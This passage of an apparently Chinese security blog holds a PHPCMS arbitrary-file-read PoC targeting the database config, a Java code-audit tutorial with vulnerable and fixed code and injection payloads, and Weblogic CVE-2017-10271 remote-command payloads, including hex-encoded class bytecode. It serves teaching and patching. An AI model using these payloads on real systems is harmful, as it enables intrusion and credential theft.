str_replace("&#123;",'',$string); $string = str_replace('&#125;','',$string); $string = str_replace('\\','',$string); return $string;&#125; 把其他无关代码去掉，就是下面这样： 12345678910111213141516171819202122init()&#123; $a_k = trim($_GET[&apos;a_k&apos;]); $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;)); $a_k = safe_replace($a_k); parse_str($a_k); $pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;); $a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &apos;ENCODE&apos;, $pc_auth_key)); $downurl = &apos;?m=content&amp;c=down&amp;a=download&amp;a_k=&apos;.$a_k; down();&#125;download()&#123; $a_k = trim($_GET[&apos;a_k&apos;]); $pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;); $a_k = sys_auth($a_k, &apos;DECODE&apos;, $pc_auth_key); $a_k = safe_replace($a_k); parse_str($a_k); // 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 $fileurl = trim($f); if($m) $fileurl = trim($s).trim($fileurl); if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$fileurl) ) showmessage(L(&apos;url_error&apos;)); $fileurl = str_replace(array(&apos;&lt;&apos;,&apos;&gt;&apos;), &apos;&apos;,$fileurl); file_down($fileurl, $filename);&#125; 注意点： php原生parse_str方法，会自动进行一次urldecode，第二个参数为空，则执行类似extract操作。 原生empty方法，对字符串””返回true。 phpcms中sys_auth是对称加密且在不知道auth_key的情况下理论上不可能构造出有效密文。 具体分析如下： 参数由$_GET[&#39;a_k&#39;]传入，经过safe_replace安全检查后,解析变量，然后检查后缀名，最后去除&lt;,&gt;这些符号，最终运行下载函数。最终$_GET[&#39;a_k&#39;]传入pad=x&amp;i=1&amp;modelid=1&amp;catid=1&amp;d=1&amp;m=1&amp;f=.p&lt;hp&amp;s=index&amp;pade=由于safe_replce的存在所以&lt;会被过滤掉，前置知识中我已经说到parse_str会自动urldecode一次。所以可以构造pad=x&amp;i=1&amp;modelid=1&amp;catid=1&amp;d=1&amp;m=1&amp;f=.p%3chp&amp;s=index&amp;pade=我们发现在init方法中会safe_replace一次，和parse_str一次。那么最终编码到download $a_k中的数据实际还是&lt;，而download方法中也会safe_replace和parse_str一次。所以我们要确保在init方法编码的时候是%3c即可，对%3c进行一次urlencode，构造d=1&amp;m=1&amp;f=.p%253chp&amp;s=index当然要读取别的目录的，那同样对目录路径进行编码。最终poc： 第一步：获取一个身份 请求http://127.0.0.1:80/phpcms/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1获取一个身份。 第二步：获取加密值 请求http://127.0.0.1:80/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dcaches/configs/database%26f%3D.p%25253chp POST： userid_flash = _siteid 第三步：获取加密值 请求http://127.0.0.1:80/phpcms/index.php?m=content&amp;c=down&amp;a=init&amp;a_k= + _att_json 总结随着开发人员的安全意识的不断提高，Web应用的安全机制也不断的增加，从代码上一眼就能看出的漏洞已经越来越少了，想要找出漏洞更需要对代码、框架的进一步理解，分析，例如：文章总的来说，不管是什么漏洞，在哪里出现，它们都有一个共同点，那就是危险函数中使用了可控参数，这些参数可被恶意用户直接或者间接控制，从函数中传进来，或者经过简单的编码，截断等处理直接进入危险函数，导致了危险行为。如果在执行危险函数前对这些可控参数进行一定判断，如必须是数字，路径必须存在，去掉某些特殊符号等则避免了问题的出现。 参考文章-1参考文章-2参考文章-3参考文章-4参考文章-5参考文章-6参考文章-7参考文章-8参考文章-9参考文章-10]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>java</tag>
        <tag>python</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计(Java)]]></title>
    <url>%2F2018%2F01%2F17%2Fcode-audit-java%2F</url>
    <content type="text"><![CDATA[概述由于工作需要，开始接触代码审计的相关工作。因为之前对这方面并没有很清晰的概念，所以特地学习下 Web应用安全的核心问题用户提交的数据不可信是Web应用程序核心安全问题。 SQL注入原理合法输入12id=1SELECT * FROM users WHRER id=&apos;1&apos;; 恶意输入12id=1&apos; or &apos;1&apos;=&apos;1SELECT * FROM users WHRER id=&apos;1&apos; or &apos;a&apos;=&apos;a&apos;; Java代码分析不合规代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public class SQLInject &#123; public static void main(String[] args)throws Exception&#123; //正常输入 select(&quot;1&quot;); // 恶意输入 select(&quot;&apos; or &apos;a&apos;=&apos;a&quot;); &#125; public static void select(String id)&#123; if (id!=null&amp;&amp;!id.isEmpty())&#123; //声明Connection对象 Connection con; //驱动程序名 String driver = &quot;com.mysql.jdbc.Driver&quot;; //URL指向要访问的数据库名mydata String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //MySQL配置时的用户名 String user = &quot;root&quot;; //MySQL配置时的密码 String password = &quot;123456&quot;; //遍历查询结果集 try &#123; //加载驱动程序 Class&lt;?&gt; aClass = Class.forName(driver); //1.getConnection()方法，连接MySQL数据库！！ con = DriverManager.getConnection(url,user,password); if(!con.isClosed()) &#123; //2.创建statement类对象，用来执行SQL语句！！ Statement statement = con.createStatement(); //要执行的SQL语句 String sql = &quot;select * from users where id=&apos;&quot; + id + &quot;&apos;&quot;; //3.ResultSet类，用来存放获取的结果集！！ ResultSet rs = statement.executeQuery(sql); System.out.println(&quot;-----------------&quot;); System.out.println(&quot;执行Sql语句: &quot;+sql); System.out.println(&quot;执行结果如下所示:&quot;); String name, uname; while (rs.next()) &#123; //获取stuname这列数据 uname = rs.getString(&quot;uname&quot;); //获取stuid这列数据 name = rs.getString(&quot;name&quot;); //输出结果 System.out.println(uname + &quot;\t&quot; + name); res.add(new String[]&#123;&quot;id: &quot;+rs.getString(&quot;id&quot;) + &quot;,uname:&quot;+rs.getString(&quot;uname&quot;) + &quot;,passwd:&quot;+rs.getString(&quot;passwd&quot;) + &quot;,name:&quot;+rs.getString(&quot;name&quot;)&#125; ); &#125; rs.close(); con.close(); &#125; &#125; catch(ClassNotFoundException e) &#123; //数据库驱动类异常处理 e.printStackTrace(); &#125; catch(SQLException e) &#123; //数据库连接失败异常处理 e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; result.put(&quot;data&quot;,res); result.put(&quot;success&quot;,true); return DataUtil.toJson(result); &#125; &#125;&#125; 123456SQL Paramter:1-----------------执行Sql语句: select * from users where id=&apos;1&apos;执行结果如下所示:test Alice----------------- 12345678SQL Paramter:&apos; or &apos;a&apos;=&apos;a-----------------执行Sql语句:select * from users where id=&apos;1&apos; or &apos;a&apos;=&apos;a&apos;执行结果如下所示:test Aliceadmin Orlevenuser Bob----------------- 合规代码（参数化查询）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class SQLFormat &#123; public static void main(String[] args)throws Exception&#123; select(&quot;1&quot;); select(&quot;&apos; or &apos;a&apos;=&apos;a&quot;); &#125; public static void select(String id)&#123; if (id!=null&amp;&amp;!id.isEmpty())&#123; //声明Connection对象 Connection con; //驱动程序名 String driver = &quot;com.mysql.jdbc.Driver&quot;; //URL指向要访问的数据库名mydata String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //MySQL配置时的用户名 String user = &quot;root&quot;; //MySQL配置时的密码 String password = &quot;123456&quot;; //遍历查询结果集 try &#123; //加载驱动程序 Class&lt;?&gt; aClass = Class.forName(driver); //1.getConnection()方法，连接MySQL数据库！！ con = DriverManager.getConnection(url,user,password); if(!con.isClosed()) &#123; //要执行的SQL语句 String sql = &quot;select * from users where id=?&quot;; //创建statement类对象，ResultSet类，用来存放获取的结果集！！ PreparedStatement stmt = con.prepareStatement(sql); stmt.setString(1, id); ResultSet rs = stmt.executeQuery(); System.out.println(&quot;-----------------&quot;); System.out.println(&quot;执行Sql语句: &quot;+stmt.toString()); System.out.println(&quot;执行结果如下所示:&quot;); String uname,name; while (rs.next()) &#123; //获取stuname这列数据 uname = rs.getString(&quot;uname&quot;); //获取stuid这列数据 name = rs.getString(&quot;name&quot;); //输出结果 System.out.println(uname + &quot;\t&quot; + name); &#125; rs.close(); con.close(); &#125; &#125; catch(ClassNotFoundException e) &#123; //数据库驱动类异常处理 e.printStackTrace(); &#125; catch(SQLException e) &#123; //数据库连接失败异常处理 e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; result.put(&quot;data&quot;,res); result.put(&quot;success&quot;,true); return DataUtil.toJson(result); &#125; &#125;&#125; 12345SQL Paramter:1-----------------执行Sql语句: select * from users where id=&apos;1&apos;执行结果如下所示:test Alice 至于为什么还有1个查询结果，那就是Mysql的字符特性的问题了，这里不作多的解释。12345SQL Paramter:&apos; or &apos;a&apos;=&apos;a-----------------执行Sql语句: select * from users where id=&apos;1\&apos; or \&apos;a\&apos;=\&apos;a&apos;执行结果如下所示:test Alice 防范建议 采用参数查询即预编译方式（首选） 字符串过滤 XXE原理合法输入123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;uname&gt;test&lt;/uname&gt; &lt;passwd&gt;e10adc3949ba59abbe56e057f20f883e&lt;/passwd&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;/user&gt;&lt;/users&gt; 1&#123;&quot;id&quot;:&quot;1&quot;,&quot;uname&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;name&quot;:&quot;Alice&quot;&#125; 恶意输入1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://localhost/text.txt&quot; &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;%26xxe;&lt;/methodname&gt;&lt;/methodcall&gt; 本地80端口WEB服务器收到如下请求： 12345127.0.0.1 - - [08/Jan/2018:17:03:27 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot; Java代码分析不合规代码1234567891011121314151617181920212223242526272829public class XMlXXEFormat &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;&quot;; XMlXXEInject(data); &#125; public String XMlXXEInject(String data)&#123; Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); List&lt;User&gt; res = new ArrayList(); result.put(&quot;success&quot;,false); if (data!=null&amp;&amp;!data.isEmpty())&#123; // 获取基于SAX的解析器的实例 try &#123; System.out.println(data); SAXParserFactory factory = SAXParserFactory.newInstance(); // 2.创建一个SAXParser实例 SAXParser saxParser = factory.newSAXParser(); // 3.解析 MySaxHandler myhandler = new MySaxHandler(); saxParser.parse(new ByteArrayInputStream(data.getBytes()), myhandler); res = myhandler.getUserList(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; result.put(&quot;data&quot;, res); System.out.println(DataUtil.toJson(result)); &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132public class XMlXXEFormat &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;&quot;; XMlXXEInject(data); &#125; public String XMlXXEInject(String data)&#123; Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); List&lt;User&gt; res = new ArrayList(); result.put(&quot;success&quot;,false); if (data!=null&amp;&amp;!data.isEmpty())&#123; // 获取基于SAX的解析器的实例 try &#123; System.out.println(data); SAXParserFactory factory = SAXParserFactory.newInstance(); factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); // 2.创建一个SAXParser实例 SAXParser saxParser = factory.newSAXParser(); // 3.解析 MySaxHandler myhandler = new MySaxHandler(); saxParser.parse(new ByteArrayInputStream(data.getBytes()), myhandler); res = myhandler.getUserList(); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; result.put(&quot;data&quot;, res); System.out.println(DataUtil.toJson(result)); &#125;&#125; 报错如下：1org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 50; 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。 防范建议 使用开发语言提供的禁用外部实体的方法（首选） 过滤用户提交的XML数据，关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 命令注入原理合法输入128.8.8.8ping -n/-c 1 8.8.8.8 恶意输入128.8.8.8 &amp; whoamiping -n/-c 1 8.8.8.8 &amp; whoami Java代码分析不合规代码123456789101112131415161718192021222324252627282930313233343536373839public class ExecTestController &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;8.8.8.8 &amp; ipconfig/all &quot;; ExecInject(data); &#125; public String ExecInject(HttpServletRequest request)&#123; String command = request.getParameter(&quot;command&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); StringBuffer buffer = null; if (command!=null&amp;&amp;!command.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; System.out.println(&quot;Command: ping&quot;+ command); Runtime rt = Runtime.getRuntime(); Process proc = rt.exec(&quot;cmd.exe /C ping &quot;+command); // Process proc = rt.exec(new String [] &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls &quot;+order&#125;); int res = proc.waitFor(); if(res !=0)&#123; System.out.println(&quot;process error: &quot;+ res); &#125; InputStream in = (res == 0)? proc.getInputStream() : proc.getErrorStream(); BufferedReader reader=new BufferedReader(new InputStreamReader(in)); buffer=new StringBuffer(); String line; while((line = reader.readLine())!=null)&#123; buffer.append(line+&quot;\n&quot;); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; System.out.print(buffer.toString()); &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132333435363738394041424344public class ExecTestController &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;8.8.8.8 &amp; ipconfig/all &quot;; ExecFormat(data); &#125; public String ExecFormat(HttpServletRequest request)&#123; String command = request.getParameter(&quot;command&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); StringBuffer buffer = null; if (command!=null&amp;&amp;!command.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; // 严格校验参数 if (!Pattern.matches(&quot;[A-Za-z@.]+&quot;, command))&#123; ; result.put(&quot;message&quot;, &quot;Error!&quot;); return DataUtil.toJson(result); &#125; System.out.println(&quot;Command: ping&quot;+ command); Runtime rt = Runtime.getRuntime(); Process proc = rt.exec(&quot;cmd.exe /C ping &quot;+command); // Process proc = rt.exec(new String [] &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls &quot;+order&#125;); int res = proc.waitFor(); if(res !=0)&#123; System.out.println(&quot;process error: &quot;+ res); &#125; InputStream in = (res == 0)? proc.getInputStream() : proc.getErrorStream(); BufferedReader reader=new BufferedReader(new InputStreamReader(in)); buffer=new StringBuffer(); String line; while((line = reader.readLine())!=null)&#123; buffer.append(line+&quot;\n&quot;); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; System.out.print(buffer.toString()); &#125;&#125; 防范建议 白名单 严格权限限制等等 严格校验参数 任意文件下载/目录遍历原理在JAVA web程序的下载文件相关的代码中，若不对HTTP请求中的待下载文件名进行检查，则有可能产生任意文件下载漏洞。目录遍历与任意文件下载的原理相似，这里就简单列个文件下载好了 合法输入12path=users.docsconfig/users.docs 恶意输入12path=../../../../Windows/System32/drivers/etc/HOSTSconfig/../../../../Windows/System32/drivers/etc/HOSTS Java代码分析不合规代码12345678910111213141516171819202122232425262728293031323334353637383940414243public class FileTestController &#123; public void FileFileDownVul(HttpServletRequest request,HttpServletResponse response)&#123; String path = request.getParameter(&quot;path&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); if (path!=null&amp;&amp;!path.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; path = &quot;config/&quot;+path; File file = new File(path); System.out.println(path); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot; + new String(path.getBytes(), &quot;ISO8859-1&quot;) + &quot;\&quot;&quot;); response.setContentLength((int) file.length()); byte[] buffer = new byte[4096];// 缓冲区 BufferedOutputStream output = null; BufferedInputStream input = null; try &#123; output = new BufferedOutputStream(response.getOutputStream()); input = new BufferedInputStream(new FileInputStream(file)); int n = -1; //遍历，开始下载 while ((n = input.read(buffer, 0, 4096)) &gt; -1) &#123; output.write(buffer, 0, n); &#125; output.flush(); //不可少 response.flushBuffer();//不可少 &#125; catch (Exception e) &#123; //异常自己捕捉 &#125; finally &#123; //关闭流，不可少 if (input != null) input.close(); if (output != null) output.close(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132333435363738394041424344public class FileTestController &#123; public void FileFileDownFormat(HttpServletRequest request,HttpServletResponse response)&#123; String path = request.getParameter(&quot;path&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); if (path!=null&amp;&amp;!path.isEmpty())&#123; try &#123; if (!Pattern.matches(&quot;^([a-z0-9]&#123;32&#125;)$&quot;, path))&#123; ; return ; &#125; path = &quot;config/&quot;+path+&quot;.docx&quot;; File file = new File(path); System.out.println(path); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot; + new String(path.getBytes(), &quot;ISO8859-1&quot;) + &quot;\&quot;&quot;); response.setContentLength((int) file.length()); byte[] buffer = new byte[4096];// 缓冲区 BufferedOutputStream output = null; BufferedInputStream input = null; try &#123; output = new BufferedOutputStream(response.getOutputStream()); input = new BufferedInputStream(new FileInputStream(file)); int n = -1; //遍历，开始下载 while ((n = input.read(buffer, 0, 4096)) &gt; -1) &#123; output.write(buffer, 0, n); &#125; output.flush(); //不可少 response.flushBuffer();//不可少 &#125; catch (Exception e) &#123; //异常自己捕捉 &#125; finally &#123; //关闭流，不可少 if (input != null) input.close(); if (output != null) output.close(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 防范建议 严格的权限限制。 控制路径后缀，对文件名进行检查等。 采用getCanonicalPath、getAbsolutePath等方法。 任意文件上传原理当攻击者利用恶意文件上传漏洞时，通常会向服务器上传jsp木马并访问，可以直接控制服务器。 合法输入1234567891011-----------------------------11922861918696Content-Disposition: form-data; name=&quot;name&quot;test.txt-----------------------------11922861918696Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plaintest-----------------------------11922861918696-- 恶意输入12345678910111213-----------------------------11922861918696Content-Disposition: form-data; name=&quot;name&quot;../test.jsp-----------------------------11922861918696Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;Content-Type: text/plain...webshell....-----------------------------11922861918696-- Java代码分析不合规代码123456789101112131415161718192021222324252627public class FileTestController &#123; @RequestMapping(&quot;/Index&quot;) public String FileFileUpload(Map&lt;String,Object&gt; map)&#123; return &quot;Fileup&quot;; &#125; @ResponseBody @RequestMapping(value= &quot;/File/FileUpVul&quot;,method= RequestMethod.POST) public String FileFileUpVul(HttpServletRequest request,@RequestParam(&quot;file&quot;) MultipartFile file)&#123; String name = request.getParameter(&quot;name&quot;); if (!file.isEmpty()) &#123; try &#123; byte[] bytes = file.getBytes(); BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(new File(&quot;config/&quot;+name))); stream.write(bytes); stream.close(); return &quot;You successfully uploaded &quot; + name + &quot; into config/&quot; + name; &#125; catch (Exception e) &#123; return &quot;You failed to upload &quot; + name + &quot; =&gt; &quot; + e.getMessage(); &#125; &#125; else &#123; return &quot;You failed to upload &quot; + name + &quot; because the file was empty.&quot;; &#125; &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829public class FileTestController &#123; @RequestMapping(&quot;/Index&quot;) public String FileFileUpload(Map&lt;String,Object&gt; map)&#123; return &quot;Fileup&quot;; &#125; @ResponseBody @RequestMapping(value= &quot;/File/FileUpVul&quot;,method= RequestMethod.POST) public String FileFileUpVul(HttpServletRequest request,@RequestParam(&quot;file&quot;) MultipartFile file)&#123; String name = DataUtil.getTimeStamp()+&quot;.jpg&quot;; if (!file.isEmpty()) &#123; try &#123; // 判断大小等等,只要做好配置，并不需要检查文件头。 if(file.getSize()&lt;1024*1024*10)&#123; byte[] bytes = file.getBytes(); BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(new File(&quot;config/&quot;+name))); stream.write(bytes); stream.close(); return &quot;You successfully uploaded &quot; + name + &quot; into config/&quot; + name; &#125; &#125; catch (Exception e) &#123; return &quot;You failed to upload &quot; + name + &quot; =&gt; &quot; + e.getMessage(); &#125; &#125; return &quot;You failed to upload &quot; + name + &quot; because the file was empty.&quot;;&#125; 防范建议 控制文件名 控制文件内容 控制上传目录的权限 XSS原理这里仅仅拿了个反射的XSS做例子。 合法输入12alicehello,alice. 恶意输入121&lt;script&gt;alert(1)&lt;/script&gt;hello,1&lt;script&gt;alert(1)&lt;/script&gt;. Java代码分析不合规代码123456789101112public class XSSTestController &#123; public String XXSXXSInject(HttpServletRequest request)&#123; String data = request.getParameter(&quot;data&quot;); if (data!=null&amp;&amp;!data.isEmpty())&#123; return &quot;hello,&quot;+data+&quot;.&quot;; &#125; return &quot;404&quot;; &#125;&#125; 合规代码123456789public class XSSTestController &#123; public String XXSXXSInject(HttpServletRequest request)&#123; String data = request.getParameter(&quot;data&quot;); if (data!=null&amp;&amp;!data.isEmpty())&#123; return &quot;hello,&quot;+HtmlUtils.htmlEscape(data)+&quot;.&quot;; &#125; return &quot;404&quot;; &#125;&#125; 121&lt;script&gt;alert(1)&lt;/script&gt;hello,1&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;. 防范建议 对用户的输入进行html编码。 其他场景这些场景和前面提到的类似或者比较浅显易懂，就不贴代码了。 压缩文件问题没有检测压缩后的大小等细节。 其他未净化输入导致日志等处被污染顾名思义，应用程序的日志被污染，如果输出到页面上也容易触发XSS。 合法输入123orleven正常用户登录失败，记录日志.....User Login Successed for: orleven 恶意输入1234orleven\r\nUser Login Successed for: administrator恶意用户登录失败，记录日志.....User Login Failed for: orlevenUser Login Successed for: administrator 正则表达式的拼接原理与SQL注入基本相同。 合法输入12search=error(.*? +public\\[\\d+\\]+.*error.*) 恶意输入12search=.*)|(.*(.*? +public\\[\\d+\\]+.*.*)|(.*.*) XML注入的拼接原理与SQL注入基本相同。 合法输入123456quantity=1&lt;item&gt; &lt;name&gt;apple&lt;/name&gt; &lt;price&gt;500.0&lt;/price&gt; &lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt; 恶意输入123456quantity=1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1&lt;item&gt; &lt;name&gt;apple&lt;/name&gt; &lt;price&gt;500.0&lt;/price&gt; &lt;quantity&gt;1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1&lt;/quantity&gt;&lt;item&gt; 总结想要学好代码审计，就必须多接触主流的的框架，例如Spring等，在了解各各类框架之后，才能更快的上手。 相关测试代码参考文章]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>code audit</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic CVE-2017-10271]]></title>
    <url>%2F2017%2F12%2F23%2Fweblogic-cve-2017-10271%2F</url>
    <content type="text"><![CDATA[概述2017年10月17日Oracle推送更新补丁，修复其所发现的安全漏洞，其中CVE-2017-10271可能会导致攻击者获得Weblogic服务器权限，请尽快修复。 详情漏洞位置Oracle Weblogic Server WLS 安全组件 影响版本Oracle Weblogic Server 10.3.6.0Oracle Weblogic Server 12.2.1.2Oracle Weblogic Server 12.2.1.1Oracle Weblogic Server 12.1.3.0 漏洞复现修改Content-Type: text/xml，并向/wls-wsat/CoordinatorPortType发送POST数据包。123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.7.0_79&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;test1234567&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot; /&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 具体复现如下： 数据包回显POC1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt; &lt;void class=&quot;java.lang.Thread&quot; method=&quot;currentThread&quot;&gt; &lt;void method=&quot;getCurrentWork&quot;&gt; &lt;void method=&quot;getResponse&quot;&gt; &lt;void method=&quot;getWriter&quot;&gt;&lt;void method=&quot;write&quot;&gt;&lt;string&gt;xmldecoder_vul_test&lt;/string&gt;&lt;/void&gt;&lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 命令回显POC123456789101112131415161718192021222324252627282930313233343536&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt; &lt;void class=&quot;weblogic.utils.Hex&quot; method=&quot;fromHexString&quot; id=&quot;cls&quot;&gt;&lt;string&gt;0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c